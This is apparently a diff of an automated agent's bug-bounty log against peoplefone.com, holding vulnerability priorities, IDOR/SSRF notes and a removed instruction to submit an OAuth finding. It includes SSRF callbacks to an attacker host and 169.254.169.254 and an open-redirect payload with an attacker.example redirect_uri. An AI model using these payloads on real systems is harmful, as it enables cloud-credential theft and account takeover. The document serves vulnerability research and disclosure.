@@ -1,4 +1,4 @@
-## 2026-09-12 13:08:46 UTC [target] (model bigpickle)
+## 2026-09-12 16:23:44 UTC [target] (model bigpickle)
 [PRIO] configuration-api.peoplefone.com/customer/voip/v1/{resource}/{id},9.0,attack_surface=9 business_value=9 tech_exposure=7 gate_ease=3 cloud_surface=8 freshness=5
 [PRIO] auth.peoplefone.com/oauth/authorize,8.5,attack_surface=8 business_value=9 tech_exposure=9 gate_ease=5 cloud_surface=7 freshness=5
 [PRIO] 5 callback/webhook endpoints (sms+smart-routing+uacsta+external-number-lookup),8.0,attack_surface=8 business_value=8 tech_exposure=8 gate_ease=3 cloud_surface=8 freshness=5
@@ -29,7 +29,6 @@ evidence_needed: post-auth callback reaches attacker host; 169.254.169.254/priva
 verify_steps: (authorized) POST SMS callbackUrl=https://attacker/x and http://169.254.169.254; inspect attacker-side receipt only
 impact: metadata/IAM theft, SIP/PBX internal pivot, call-metadata leak; CRITICAL
 testability: AUTH_HELPED
-[NEXT] HUMAN: Submit the OAuth open-redirect/login-CSRF finding now to bugs.olivermaicher.eu — 40th frozen cycle, triage VALID 7.4 (9.1 conditional). Payload: `GET /oauth/authorize?client_id=1&response_type=token&redirect_uri=https://attacker.example/cb&scope=openid` against auth.peoplefone.com; attach the fresh 09:27Z trace (404 still Set-Cookie `redirect_uri=<attacker value>`, Max-Age=34560000 httponly secure) plus warm-session 302→/de_CH/login preserving arbitrary redirect_uri with implicit+PKCE params accepted; state token endpoint enforces client_secret for 1/4/5 (code-theft ATO falsified) so severity sits at the open-redirect/login-CSRF primitive unless implicit fragment is reproduced. Include PoC, impact, CVSS 7.4, contact. Also flag the empty-lead triage runs so the gate can be re-confirmed post-submission.
 [LEARN] ACCEPTED AUTH @ auth.peoplefone.com: register 500 / token GET 405 + POST(client_id=1)→401 + POST(no-body)→500 / stateless authorize 404+attacker redirect_uri cookie / api-doc 200 — NO_DELTA re-verified fresh this cycle; 40th frozen cycle; 00:30 triage VALID on open-redirect/login-CSRF.
 [LEARN] ACCEPTED IDOR @ configuration-api {identifier} CRUD: no counter-evidence; rank holds; token-gated (40th frozen cycle); triage HOLD pending bearer token.
 [LEARN] ACCEPTED SSRF @ 5 callback endpoints: no counter-evidence; retained pending token (40th frozen cycle); triage HOLD.
